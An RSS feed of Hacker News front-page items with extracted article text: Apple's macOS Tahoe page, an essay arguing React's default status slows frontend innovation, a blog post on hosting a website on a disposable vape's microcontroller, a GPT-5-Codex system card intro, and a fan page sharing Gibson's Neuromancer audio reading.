<?xml version='1.0' encoding='UTF-8'?>
<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>Hacker News: Front Page</title><link>https://raw.githubusercontent.com/Prabesh01/hnrss-content-extract/refs/heads/main/out/rss.xml</link><description>Hacker News RSS</description><atom:link href="https://raw.githubusercontent.com/Prabesh01/hnrss-content-extract/refs/heads/main/out/rss.xml" rel="self"/><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><language>en</language><lastBuildDate>Tue, 16 Sep 2025 14:40:20 +0000</lastBuildDate><item><title>macOS Tahoe</title><link>https://www.apple.com/os/macos/</link><description>&lt;doc fingerprint="a4b4eb2d8b62abe1"&gt;
  &lt;main&gt;
    &lt;p&gt;A new design with Liquid Glass. Beautiful, delightful, and instantly familiar.&lt;/p&gt;
    &lt;p&gt;Now with the Phone app1 and Live Activities2 from iPhone for next‑level Continuity.&lt;/p&gt;
    &lt;p&gt;Take hundreds of actions in Spotlight without lifting your hands off the keyboard.&lt;/p&gt;
    &lt;p&gt;Create more powerful shortcuts than ever with Apple Intelligence.3&lt;/p&gt;
    &lt;p&gt;Design&lt;/p&gt;
    &lt;p&gt;More you. Shines through.&lt;/p&gt;
    &lt;p&gt;Reimagined with Liquid Glass, macOS Tahoe is at once fresh and familiar. Apps bring more focus to your content. You can personalize your Mac like never before. And everything just flows into place.&lt;/p&gt;
    &lt;p&gt;Delightful new design.&lt;/p&gt;
    &lt;p&gt;Liquid Glass refracts and reflects content in real time, bringing even more clarity to navigation and controls — and even more vitality to everything you do.&lt;/p&gt;
    &lt;p&gt;Updated app icons.&lt;/p&gt;
    &lt;p&gt;Personalize your Mac with new options including updated light or dark appearances, new color-tinted icons, or a stunning clear look.&lt;/p&gt;
    &lt;p&gt;Personalized controls and menu bar.&lt;/p&gt;
    &lt;p&gt;Your display feels even larger with the transparent menu bar. And you have more ways to customize the controls and layout in the menu bar and Control Center, even those from third parties.&lt;/p&gt;
    &lt;p&gt;Refreshed apps.&lt;/p&gt;
    &lt;p&gt;Sidebars and toolbars in apps reflect the depth of your workspace and offer a subtle hint of the content within reach as you scroll.&lt;/p&gt;
    &lt;p&gt;Apple Intelligence&lt;/p&gt;
    &lt;p&gt;Get more done, from even more places.&lt;/p&gt;
    &lt;p&gt;Now integrated into even more apps and experiences, Apple Intelligence helps you get things done effortlessly and communicate across languages.3&lt;/p&gt;
    &lt;p&gt;Live Translation.&lt;/p&gt;
    &lt;p&gt;Automatically translate texts in Messages,4 display live translated captions in FaceTime, and get spoken translations for calls in the Phone app.5&lt;/p&gt;
    &lt;p&gt;Accelerate your workflows.&lt;/p&gt;
    &lt;p&gt;Intelligent actions in Shortcuts can summarize text, create images, or tap directly into Apple Intelligence models to provide responses that feed into your shortcut.&lt;/p&gt;
    &lt;p&gt;More ways to express yourself with images.&lt;/p&gt;
    &lt;p&gt;Mix emoji and descriptions to make something brand-new. In Image Playground, discover additional ChatGPT styles. And have even more control when making images inspired by family and friends using Genmoji and Image Playground.6&lt;/p&gt;
    &lt;p&gt;Continuity&lt;/p&gt;
    &lt;p&gt;Together they’re better than ever.&lt;/p&gt;
    &lt;p&gt;Continuity helps you work seamlessly across Apple devices. And with the Phone app and Live Activities coming to Mac, it’s even easier to stay on top of things happening in real time.&lt;/p&gt;
    &lt;p&gt;Live Activities on Mac.&lt;/p&gt;
    &lt;p&gt;The menu bar now features the Live Activities from your iPhone. And when you click one, the app opens in iPhone Mirroring so you can take action.2&lt;/p&gt;
    &lt;p&gt;New Phone app for Mac.&lt;/p&gt;
    &lt;p&gt;Make and take calls with a click. Conveniently access your synced content like Recents, Contacts, and Voicemail — and enjoy the familiar features from iPhone.1&lt;/p&gt;
    &lt;p&gt;Manage unwanted calls.&lt;/p&gt;
    &lt;p&gt;For unknown numbers, Call Screening finds out who’s calling and why. Once the caller shares their name and the reason for their call, your phone rings and you can decide if you want to pick up.7&lt;/p&gt;
    &lt;p&gt;Stay productive while on hold.&lt;/p&gt;
    &lt;p&gt;Hold Assist keeps your spot in line while you wait for a live agent and notifies you when they’re ready.8&lt;/p&gt;
    &lt;p&gt;Productivity&lt;/p&gt;
    &lt;p&gt;Calm in the brainstorm.&lt;/p&gt;
    &lt;p&gt;Make quick work of everyday tasks, jump into your favorite activities, and turbocharge pro workflows — all with a whole lot less effort.&lt;/p&gt;
    &lt;p&gt;Biggest Spotlight update ever.&lt;/p&gt;
    &lt;p&gt;Spotlight lets you take hundreds of actions without lifting your hands off the keyboard. And new quick keys help you perform actions even faster.&lt;/p&gt;
    &lt;p&gt;A faster way to browse.&lt;/p&gt;
    &lt;p&gt;You can now keep all your apps and most accessed files within easy reach, including intelligent suggestions based on your routines.&lt;/p&gt;
    &lt;p&gt;Smart, effortless automation.&lt;/p&gt;
    &lt;p&gt;Now you can run shortcuts automatically — at a specific time of day or when you take specific actions, like saving a file to a particular folder or connecting to a display.&lt;/p&gt;
    &lt;p&gt;Magnifier lets you zoom in on your surroundings using a connected camera. Accessibility Reader provides a systemwide, customized reading and listening experience. Braille Access creates an all-new interface for braille displays.9 And Vehicle Motion Cues help reduce motion sickness in moving vehicles.&lt;/p&gt;
    &lt;p&gt;Family.&lt;/p&gt;
    &lt;p&gt;Parents can take advantage of a wide set of parental controls designed to keep children safe. These include new enhancements across Communication Limits, Communication Safety, and the App Store.&lt;/p&gt;
    &lt;p&gt;Journal.&lt;/p&gt;
    &lt;p&gt;Now on Mac for the most comfortable writing experience, Journal makes it easy to capture and write about everyday moments and special events using photos, videos, audio recordings, places, and more.&lt;/p&gt;
    &lt;p&gt;Photos.&lt;/p&gt;
    &lt;p&gt;An updated design lets you quickly access filtering and sorting options and customize the size of Collections tiles so you can view your library just how you like. And with Pinned Collections, you can keep your most-visited ones right at your fingertips.&lt;/p&gt;
    &lt;p&gt;FaceTime.&lt;/p&gt;
    &lt;p&gt;Celebrate the people who matter most with a new tiled design that features beautiful and personalized Contact Posters.&lt;/p&gt;
    &lt;p&gt;Reminders.&lt;/p&gt;
    &lt;p&gt;With Apple Intelligence, Reminders can suggest tasks, grocery items, and follow-ups based on emails or other text on your device. It can also automatically categorize related reminders into sections within a list.&lt;/p&gt;
    &lt;p&gt;Games.&lt;/p&gt;
    &lt;p&gt;The new Games app brings together all the games you have on your Mac. In the Game Overlay, you can adjust system settings, chat with friends, or invite them to play — all without leaving the game. And for developers, Metal 4 brings even more advanced graphics and rendering technologies, like MetalFX Frame Interpolation and Denoising.&lt;/p&gt;
    &lt;p&gt;Messages.&lt;/p&gt;
    &lt;p&gt;Create polls and personalize conversations with backgrounds. Redesigned conversation details feature designated sections for contact info, photos, links, location, and more. Typing indicators in groups let you know exactly who is about to chime in. Screening tools detect spam and give you control. And the Add Contact button now appears next to an unknown number in a group.&lt;/p&gt;
    &lt;p&gt;Passwords.&lt;/p&gt;
    &lt;p&gt;Easily refer to changes you’ve made to your accounts. Find previous versions of passwords, along with when they were changed.&lt;/p&gt;
    &lt;p&gt;Notes.&lt;/p&gt;
    &lt;p&gt;Capture conversations in the Phone app as audio recordings with transcriptions.10 You can also export a note into a Markdown file.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45252378</guid><pubDate>Mon, 15 Sep 2025 17:16:42 +0000</pubDate></item><item><title>React is winning by default and slowing innovation</title><link>https://www.lorenstew.art/blog/react-won-by-default/</link><description>&lt;doc fingerprint="b7e9953b6b12f9da"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;React Won by Default – And It's Killing Frontend Innovation&lt;/head&gt;
    &lt;p&gt;React-by-default has hidden costs. Here's a case for making deliberate choices to select the right framework for the job.&lt;/p&gt;
    &lt;head rend="h1"&gt;React Won by Default – And It’s Killing Frontend Innovation&lt;/head&gt;
    &lt;p&gt;React is no longer winning by technical merit. Today it is winning by default. That default is now slowing innovation across the frontend ecosystem.&lt;/p&gt;
    &lt;p&gt;When teams need a new frontend, the conversation rarely starts with “What are the constraints and which tool best fits them?” It often starts with “Let’s use React; everyone knows React.” That reflex creates a self-perpetuating cycle where network effects, rather than technical fit, decide architecture.&lt;/p&gt;
    &lt;p&gt;Meanwhile, frameworks with real innovations struggle for adoption. Svelte compiles away framework overhead. Solid delivers fine-grained reactivity without virtual-DOM tax. Qwik achieves instant startup via resumability. These approaches can outperform React’s model in common scenarios, but they rarely get a fair evaluation because React is chosen by default.&lt;/p&gt;
    &lt;p&gt;React is excellent at many things. The problem isn’t React itself, it’s the React-by-default mindset.&lt;/p&gt;
    &lt;head rend="h2"&gt;The Innovation Ceiling&lt;/head&gt;
    &lt;p&gt;React’s technical foundations explain some of today’s friction. The virtual DOM was a clever solution for 2013’s problems, but as Rich Harris outlined in “Virtual DOM is pure overhead”, it introduces work modern compilers can often avoid.&lt;/p&gt;
    &lt;p&gt;Hooks addressed class component pain but introduced new kinds of complexity: dependency arrays, stale closures, and misused effects. Even React’s own docs emphasize restraint: “You Might Not Need an Effect”. Server Components improve time-to-first-byte, but add architectural complexity and new failure modes.&lt;/p&gt;
    &lt;p&gt;The React Compiler is a smart solution that automates patterns like &lt;code&gt;useMemo&lt;/code&gt;/&lt;code&gt;useCallback&lt;/code&gt;. Its existence is also a signal: we’re optimizing around constraints baked into the model.&lt;/p&gt;
    &lt;p&gt;Contrast this with alternative approaches: Svelte 5’s Runes simplify reactivity at compile time; Solid’s fine-grained reactivity updates exactly what changed; Qwik’s resumability eliminates traditional hydration. These aren’t incremental tweaks to React’s model—they’re different models with different ceilings.&lt;/p&gt;
    &lt;p&gt;Innovation without adoption doesn’t change outcomes. Adoption can’t happen when the choice is made by reflex.&lt;/p&gt;
    &lt;head rend="h2"&gt;The Technical Debt We’re All Carrying&lt;/head&gt;
    &lt;p&gt;Defaulting to React often ships a runtime and reconciliation cost we no longer question. Even when it’s fast enough, the ceiling is lower than compile-time or fine-grained models. Developer time is spent managing re-renders, effect dependencies, and hydration boundaries instead of shipping value. The broader lesson from performance research is consistent: JavaScript is expensive on the critical path (The Cost of JavaScript).&lt;/p&gt;
    &lt;p&gt;We’ve centered mental models around “React patterns” instead of web fundamentals, reducing portability of skills and making architectural inertia more likely.&lt;/p&gt;
    &lt;p&gt;The loss isn’t just performance, it’s opportunity cost when better-fit alternatives are never evaluated. For instance, benchmarks like the JS Framework Benchmark show alternatives like Solid achieving up to 2-3x faster updates in reactivity-heavy scenarios compared to React.&lt;/p&gt;
    &lt;head rend="h2"&gt;The Frameworks Being Suffocated&lt;/head&gt;
    &lt;head rend="h3"&gt;Svelte: The Compiler Revolution&lt;/head&gt;
    &lt;p&gt;Svelte shifts work to compile time: no virtual DOM, minimal runtime. Components become targeted DOM operations. The mental model aligns with web fundamentals.&lt;/p&gt;
    &lt;p&gt;But “not enough jobs” keeps Svelte adoption artificially low despite its technical superiority for most use cases. Real-world examples, like The Guardian’s adoption of Svelte for their frontend, demonstrate measurable gains in performance and developer productivity, with reported reductions in bundle sizes and faster load times. For instance, as detailed in Wired’s article on Svelte, developer Shawn Wang (@swyx on X/Twitter) reduced his site’s size from 187KB in React to just 9KB in Svelte by leveraging its compile-time optimizations, which shift framework overhead away from runtime. This leads to faster, more efficient apps especially on slow connections.&lt;/p&gt;
    &lt;head rend="h3"&gt;Solid: The Reactive Primitive Approach&lt;/head&gt;
    &lt;p&gt;Solid delivers fine-grained reactivity with JSX familiarity. Updates flow through signals directly to affected DOM nodes, bypassing reconciliation bottlenecks. Strong performance characteristics, limited mindshare. As outlined in Solid’s comparison guide, this approach enables more efficient updates than React’s virtual DOM, with precise reactivity that minimizes unnecessary work and improves developer experience through simpler state management.&lt;/p&gt;
    &lt;p&gt;While prominent case studies are scarcer than for more established frameworks, this is largely due to Solid’s lower adoption. Yet anecdotal reports from early adopters suggest similar transformative gains in update efficiency and code simplicity, waiting to be scaled and shared as more teams experiment.&lt;/p&gt;
    &lt;head rend="h3"&gt;Qwik: The Resumability Innovation&lt;/head&gt;
    &lt;p&gt;Qwik uses resumability instead of hydration, enabling instant startup by loading only what the current interaction needs. Ideal for large sites, long sessions, or slow networks. According to Qwik’s Think Qwik guide, this is achieved through progressive loading and serializing both state and code. Apps can thus resume execution instantly without heavy client-side bootstrapping, resulting in superior scalability and reduced initial load times compared to traditional frameworks.&lt;/p&gt;
    &lt;p&gt;Success stories for Qwik may be less visible simply because fewer teams have broken from defaults to try it. But those who have report dramatic improvements in startup times and resource efficiency, indicating a wealth of untapped potential if adoption grows.&lt;/p&gt;
    &lt;p&gt;All three under-adopted not for lack of merit, but because the default choice blocks trying them out.&lt;/p&gt;
    &lt;p&gt;Furthermore, React’s API surface area is notably larger and more complex than its alternatives, encompassing concepts like hooks, context, reducers, and memoization patterns that require careful management to avoid pitfalls. This expansive API contributes to higher cognitive load for developers, often leading to bugs from misunderstood dependencies or over-engineering. For example, in Cloudflare’s September 12, 2025 outage, a useEffect hook with a problematic dependency array triggered repeated API calls, overwhelming their Tenant Service and causing widespread failures. In contrast, frameworks like Svelte, Solid, and Qwik feature smaller, more focused APIs that emphasize simplicity and web fundamentals, reducing the mental overhead and making them easier to master and maintain.&lt;/p&gt;
    &lt;head rend="h2"&gt;The Network Effect Prison&lt;/head&gt;
    &lt;p&gt;React’s dominance creates self-reinforcing barriers. Job postings ask for “React developers” rather than “frontend engineers,” limiting skill diversity. Component libraries and team muscle memory create institutional inertia.&lt;/p&gt;
    &lt;p&gt;Risk-averse leaders choose the “safe” option. Schools teach what jobs ask for. The cycle continues independent of technical merit.&lt;/p&gt;
    &lt;p&gt;That’s not healthy competition; it’s ecosystem capture by default.&lt;/p&gt;
    &lt;head rend="h2"&gt;Breaking the Network Effect&lt;/head&gt;
    &lt;p&gt;Escaping requires deliberate action at multiple levels. Technical leaders should choose based on constraints and merits, not momentum. Companies can allocate a small innovation budget to trying alternatives. Developers can upskill beyond a single mental model.&lt;/p&gt;
    &lt;p&gt;Educators can teach framework-agnostic concepts alongside specific tools. Open source contributors can help alternative ecosystems mature.&lt;/p&gt;
    &lt;p&gt;Change won’t happen automatically. It requires conscious choice.&lt;/p&gt;
    &lt;head rend="h2"&gt;Framework Evaluation Checklist&lt;/head&gt;
    &lt;p&gt;To make deliberate choices, use this simple checklist when starting a new project:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Assess Performance Needs: Evaluate metrics like startup time, update efficiency, and bundle size. Prioritize frameworks with compile-time optimizations if speed is critical.&lt;/item&gt;
      &lt;item&gt;Team Skills and Learning Curve: Consider existing expertise but factor in migration paths; many alternatives offer gentle ramps (e.g., Solid’s JSX compatibility with React).&lt;/item&gt;
      &lt;item&gt;Scaling and Cost of Ownership: Calculate long-term costs, including maintenance, dependency management, and tech debt. Alternatives often reduce runtime overhead, lowering hosting costs and improving scalability.&lt;/item&gt;
      &lt;item&gt;Ecosystem Fit: Balance maturity with innovation; pilot in non-critical areas to test migration feasibility and ROI.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;The Standard Counter‑Arguments&lt;/head&gt;
    &lt;p&gt;“But ecosystem maturity!” Maturity is valuable, and can also entrench inertia. Age isn’t the same as fitness for today’s constraints.&lt;/p&gt;
    &lt;p&gt;Additionally, a mature ecosystem often means heavy reliance on third-party packages, which can introduce maintenance burdens like keeping dependencies up-to-date, dealing with security vulnerabilities, and bloating bundles with unused code. While essential in some cases, this flexibility can lead to over-dependence; custom solutions tailored to specific needs are often leaner and more maintainable in the long run. Smaller ecosystems in alternative frameworks encourage building from fundamentals, fostering deeper understanding and less technical debt. Moreover, with AI coding assistants now able to generate precise, custom functions on demand, the barrier to creating bespoke utilities has lowered dramatically. This makes it feasible to avoid generic libraries like lodash or date libraries like Moment or date-fns entirely in favor of lightweight, app-specific implementations.&lt;/p&gt;
    &lt;p&gt;“But hiring!” Hiring follows demand. You can de‑risk by piloting alternatives in non‑critical paths, then hiring for fundamentals plus on‑the‑job training.&lt;/p&gt;
    &lt;p&gt;“But component libraries!” Framework‑agnostic design systems and Web Components reduce lock-in while preserving velocity.&lt;/p&gt;
    &lt;p&gt;“But stability!” React’s evolution from classes to hooks to Server Components demonstrates constant churn, not stability. Alternative frameworks often provide more consistent APIs.&lt;/p&gt;
    &lt;p&gt;“But proven at scale!” jQuery was proven at scale too. Past success doesn’t guarantee future relevance.&lt;/p&gt;
    &lt;head rend="h2"&gt;The Broader Ecosystem Harm&lt;/head&gt;
    &lt;p&gt;Monoculture slows web evolution when one framework’s constraints become de facto limits. Talent spends cycles solving framework-specific issues rather than pushing the platform forward. Investment follows incumbents regardless of technical merit.&lt;/p&gt;
    &lt;p&gt;Curricula optimize for immediate employability over fundamentals, creating framework-specific rather than transferable skills. Platform improvements get delayed because “React can handle it” becomes a default answer.&lt;/p&gt;
    &lt;p&gt;The entire ecosystem suffers when diversity disappears.&lt;/p&gt;
    &lt;head rend="h2"&gt;The Garden We Could Grow&lt;/head&gt;
    &lt;p&gt;Healthy ecosystems require diversity, not monocultures. Innovation emerges when different approaches compete and cross-pollinate. Developers grow by learning multiple mental models. The platform improves when several frameworks push different boundaries.&lt;/p&gt;
    &lt;p&gt;Betting everything on one model creates a single point of failure. What happens if it hits hard limits? What opportunities are we missing by not exploring alternatives?&lt;/p&gt;
    &lt;p&gt;It’s time to choose frameworks based on constraints and merit rather than momentum. Your next project deserves better than React-by-default. The ecosystem deserves the innovation only diversity can provide.&lt;/p&gt;
    &lt;p&gt;Stop planting the same seed by default. The garden we could cultivate through diverse framework exploration would be more resilient and more innovative than the monoculture we’ve drifted into.&lt;/p&gt;
    &lt;p&gt;The choice is ours to make.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45252715</guid><pubDate>Mon, 15 Sep 2025 17:46:01 +0000</pubDate></item><item><title>Hosting a website on a disposable vape</title><link>https://bogdanthegeek.github.io/blog/projects/vapeserver/</link><description>&lt;doc fingerprint="26b5c1054b922ae9"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Hosting a WebSite on a Disposable Vape&lt;/head&gt;
    &lt;head rend="h1"&gt;Preface#&lt;/head&gt;
    &lt;p&gt;This article is NOT served from a web server running on a disposable vape. If you want to see the real deal, click here. The content is otherwise identical.&lt;/p&gt;
    &lt;head rend="h1"&gt;Background#&lt;/head&gt;
    &lt;p&gt;For a couple of years now, I have been collecting disposable vapes from friends and family. Initially, I only salvaged the batteries for “future” projects (It’s not hoarding, I promise), but recently, disposable vapes have gotten more advanced. I wouldn’t want to be the lawyer who one day will have to argue how a device with USB C and a rechargeable battery can be classified as “disposable”. Thankfully, I don’t plan on pursuing law anytime soon.&lt;/p&gt;
    &lt;p&gt;Last year, I was tearing apart some of these fancier pacifiers for adults when I noticed something that caught my eye, instead of the expected black blob of goo hiding some ASIC (Application Specific Integrated Circuit) I see a little integrated circuit inscribed “PUYA”. I don’t blame you if this name doesn’t excite you as much it does me, most people have never heard of them. They are most well known for their flash chips, but I first came across them after reading Jay Carlson’s blog post about the cheapest flash microcontroller you can buy. They are quite capable little ARM Cortex-M0+ micros.&lt;/p&gt;
    &lt;p&gt;Over the past year I have collected quite a few of these PY32 based vapes, all of them from different models of vape from the same manufacturer. It’s not my place to do free advertising for big tobacco, so I won’t mention the brand I got it from, but if anyone who worked on designing them reads this, thanks for labeling the debug pins!&lt;/p&gt;
    &lt;head rend="h1"&gt;What are we working with#&lt;/head&gt;
    &lt;p&gt;The chip is marked &lt;code&gt;PUYA C642F15&lt;/code&gt;, which wasn’t very helpful. I was pretty sure it was a &lt;code&gt;PY32F002A&lt;/code&gt;, but after poking around with pyOCD, I noticed that the flash was 24k and we have 3k of RAM. The extra flash meant that it was more likely a &lt;code&gt;PY32F002B&lt;/code&gt;, which is actually a very different chip.1&lt;/p&gt;
    &lt;p&gt;So here are the specs of a microcontroller so bad, it’s basically disposable:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;24MHz Coretex M0+&lt;/item&gt;
      &lt;item&gt;24KiB of Flash Storage&lt;/item&gt;
      &lt;item&gt;3KiB of Static RAM&lt;/item&gt;
      &lt;item&gt;a few peripherals, none of which we will use.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;You may look at those specs and think that it’s not much to work with. I don’t blame you, a 10y old phone can barely load google, and this is about 100x slower. I on the other hand see a blazingly fast web server.&lt;/p&gt;
    &lt;head rend="h1"&gt;Getting online#&lt;/head&gt;
    &lt;p&gt;The idea of hosting a web server on a vape didn’t come to me instantly. In fact, I have been playing around with them for a while, but after writing my post on semihosting, the penny dropped.&lt;/p&gt;
    &lt;p&gt;If you don’t feel like reading that article, semihosting is basically syscalls for embedded ARM microcontrollers. You throw some values/pointers into some registers and call a breakpoint instruction. An attached debugger interprets the values in the registers and performs certain actions. Most people just use this to get some logs printed from the microcontroller, but they are actually bi-directional.&lt;/p&gt;
    &lt;p&gt;If you are older than me, you might remember a time before Wi-Fi and Ethernet, the dark ages, when you had to use dial-up modems to get online. You might also know that the ghosts of those modems still linger all around us. Almost all USB serial devices actually emulate those modems: a 56k modem is just 57600 baud serial device. Data between some of these modems was transmitted using a protocol called SLIP (Serial Line Internet Protocol).2&lt;/p&gt;
    &lt;p&gt;This may not come as a surprise, but Linux (and with some tweaking even macOS) supports SLIP. The &lt;code&gt;slattach&lt;/code&gt; utility can make any &lt;code&gt;/dev/tty*&lt;/code&gt; send and receive IP packets. All we have to do is put the data down the wire in the right format and provide a virtual tty.
This is actually easier than you might imagine, pyOCD can forward all semihosting though a telnet port. Then, we use &lt;code&gt;socat&lt;/code&gt; to link that port to a virtual tty:&lt;/p&gt;
    &lt;code&gt;pyocd gdb -S -O semihost_console_type=telnet -T $(PORT) $(PYOCDFLAGS) &amp;amp;
socat PTY,link=$(TTY),raw,echo=0 TCP:localhost:$(PORT),nodelay &amp;amp;
sudo slattach -L -p slip -s 115200 $(TTY) &amp;amp;
sudo ip addr add 192.168.190.1 peer 192.168.190.2/24 dev sl0
sudo ip link set mtu 1500 up dev sl0
&lt;/code&gt;
    &lt;p&gt;Ok, so we have a “modem”, but that’s hardly a web server. To actually talk TCP/IP, we need an IP stack. There are many choices, but I went with uIP because it’s pretty small, doesn’t require an RTOS, and it’s easy to port to other platforms. It also, helpfully, comes with a very minimal HTTP server example.&lt;/p&gt;
    &lt;p&gt;After porting the SLIP code to use semihosting, I had a working web server&amp;amp;mldr;half of the time. As with most highly optimised libraries, uIP was designed for 8 and 16-bit machines, which rarely have memory alignment requirements. On ARM however, if you dereference a &lt;code&gt;u16 *&lt;/code&gt;, you better hope that address is even, or you’ll get an exception. The &lt;code&gt;uip_chksum&lt;/code&gt; assumed &lt;code&gt;u16&lt;/code&gt; alignment, but the script that creates the filesystem didn’t.
I actually decided to modify a bit the structure of the filesystem to make it a bit more portable.
This was my first time working with &lt;code&gt;perl&lt;/code&gt; and I have to say, it’s quite well suited to this kind of task.&lt;/p&gt;
    &lt;head rend="h1"&gt;Blazingly fast#&lt;/head&gt;
    &lt;p&gt;So how fast is a web server running on a disposable microcontroller. Well, initially, not very fast. Pings took ~1.5s with 50% packet loss and a simple page took over 20s to load. That’s so bad, it’s actually funny, and I kind of wanted to leave it there.&lt;/p&gt;
    &lt;p&gt;However, the problem was actually between the seat and the steering wheel the whole time. The first implementation read and wrote a single character at a time, which had a massive overhead associated with it. I previously benchmarked semihosting on this device, and I was getting ~20KiB/s, but uIP’s SLIP implementation was designed for very low memory devices, so it was serialising the data byte by byte. We have a whopping 3kiB of RAM to play with, so I added a ring buffer to cache reads from the host and feed them into the SLIP poll function. I also split writes in batches to allow for escaping.&lt;/p&gt;
    &lt;p&gt;Now this is what I call blazingly fast! Pings now take 20ms, no packet loss and a full page loads in about 160ms. This was using using almost all of the RAM, but I could also dial down the sizes of the buffer to have more than enough headroom to run other tasks. The project repo has everything set to a nice balance latency and RAM usage:&lt;/p&gt;
    &lt;code&gt;Memory region         Used Size  Region Size  %age Used
           FLASH:        5116 B        24 KB     20.82%
             RAM:        1380 B         3 KB     44.92%
&lt;/code&gt;
    &lt;p&gt;For this blog however, I paid for none of the RAM, so I’ll use all of the RAM.&lt;/p&gt;
    &lt;p&gt;As you may have noticed, we have just under 20kiB (80%) of storage space. That may not be enough to ship all of React, but as you can see, it’s more than enough to host this entire blog post. And this is not just a static page server, you can run any server-side code you want, if you know C that is.&lt;/p&gt;
    &lt;p&gt;Just for fun, I added a json api endpoint to get the number of requests to the main page (since the last crash) and the unique ID of the microcontroller.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45252817</guid><pubDate>Mon, 15 Sep 2025 17:53:19 +0000</pubDate></item><item><title>Addendum to GPT-5 system card: GPT-5-Codex</title><link>https://openai.com/index/gpt-5-system-card-addendum-gpt-5-codex/</link><description>&lt;doc fingerprint="9c432defe1bb46cd"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Addendum to GPT-5 system card: GPT-5-Codex&lt;/head&gt;
    &lt;p&gt;GPT‑5-Codex is a version of GPT‑5 optimized for agentic coding in Codex. Like its predecessor, codex-1, this model was trained using reinforcement learning on real-world coding tasks in a variety of environments to generate code that closely mirrors human style and PR preferences, adhere precisely to instructions, and iteratively run tests until passing results are achieved.&lt;/p&gt;
    &lt;p&gt;This model is available locally in the terminal or IDE through Codex CLI and IDE extension, and on the cloud via the Codex web, GitHub, and the ChatGPT mobile app.&lt;/p&gt;
    &lt;p&gt;This addendum outlines the comprehensive safety measures implemented for GPT‑5-Codex. It details both model-level mitigations, such as specialized safety training for harmful tasks and prompt injections, and product-level mitigations like agent sandboxing and configurable network access.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45253458</guid><pubDate>Mon, 15 Sep 2025 18:45:32 +0000</pubDate></item><item><title>William Gibson Reads Neuromancer (2004)</title><link>http://bearcave.com/bookrev/neuromancer/neuromancer_audio.html</link><description>&lt;doc fingerprint="7a59d0cbefbe40c0"&gt;
  &lt;main&gt;
    &lt;p&gt;The author Ray Bradbury is one of the early science fiction authors that moved science fiction into a literary form. As a writer Bradbury constructs beautifully written stories and novels. Bradbury's writing is in stark contrast to Bradbury as a speaker. The first time I heard Ray Bradbury speak was at the Association for Computing Machinery (ACM) yearly conference in Los Angeles in the 1980s. Hearing Bradbury speak is an almost painful experience. The pictures that Bradbury can paint with the written word seem to be entirely missing when Bradbury speaks. He is halting, awkward and does not seem to know where he wants to go in his talk.&lt;/p&gt;
    &lt;p&gt;In contrast to Bradbury, listenting to William Gibson has the feel of his written work. The same complex world view and sentence structure is there, although not as finely edited. An example of this can be found in the documentary made about William Gibson, No Maps for these Territories. This documentary includes extensive interviews with William Gibson. No Maps also provides a glimpse of the way Gibson looks at the interconnections and relationships in the world around us. This view of Gibson's mind shows us his genius.&lt;/p&gt;
    &lt;p&gt;The mirror between William Gibson's spoken voice and his written voice gives special force to his readings of his work. Early in his career Gibson did an abridged reading of Neuromancer, his first novel and the work that made him famous. It was in this novel that Gibson coined the term cyberspace. This reading was only published on audio-tape and is now out of print.&lt;/p&gt;
    &lt;p&gt;I hate the idea that Gibson's wonderful reading of Neuromancer should be lost or inaccessable. I was only able to hear it because the Mountain View (California) Library had a copy. Fortunately I've been able to find an MP3 copy of these audio tapes. They can be downloaded below.&lt;/p&gt;
    &lt;p&gt;I am only providing these MP3s because the original has been out of print for years. As a software engineer I believe that I should be paid for my work. If I hold this view then it is only reasonable that I should also believe that artist should be paid for their work. All of the software and music I own I have paid for (or is open source). I would prefer that the publisher re-issue the audio-tape of William Gibson's reading in a more modern format (perhaps CD) and that William Gibson collect royalties on this work. Gibson's reading has been out of print so long that I can only assume that this is unlikely to happen.&lt;/p&gt;
    &lt;p&gt;If you're a fan of William Gibson I hope that others will mirror these files as well so that they will never be lost.&lt;/p&gt;
    &lt;p&gt;This reading was published on four magnetic tape audio cassetts. These have been re-recorded in MP3 format:&lt;/p&gt;
    &lt;table&gt;
      &lt;row&gt;
        &lt;cell role="head"&gt;Neuromancer (abridged) read by William Gibson&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Tape 1, side 1&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Tape 1, side 2&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Tape 2, side 1&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Tape 2, side 2&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Tape 3, side 1&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Tape 3, side 2&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Tape 4, side 1&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Tape 4, side 2&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;An on-line copy of William Gibson's Neuromancer&lt;/p&gt;
    &lt;p&gt;Neuromancer is one of the few books that I've read many times. All of Gibson's books are good (well, except for The Difference Engine, but that's Bruce Sterling's fault). Neuromancer is still in print, so you should go out an buy a copy if you want to read it. Writers pay their bills from the royalties from book sales. I've included the link above in case you want to get a feel for the book before you buy it (even paperback books are not cheap these days).&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
